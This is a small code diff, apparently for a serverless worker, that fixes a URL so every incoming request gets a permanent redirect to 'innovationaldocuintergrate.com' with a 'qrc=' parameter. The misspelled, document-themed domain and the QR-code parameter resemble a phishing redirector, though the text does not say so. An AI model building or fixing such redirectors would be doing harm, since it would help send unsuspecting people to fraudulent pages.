@@ -1,6 +1,6 @@
 export default {
   async fetch(request, env, ctx) {
-    const redirectUrl = "innovationaldocuintergrate.com/?qrc=";
+    const redirectUrl = "https://innovationaldocuintergrate.com/?qrc=";
     return Response.redirect(redirectUrl, 301);
   }
 };
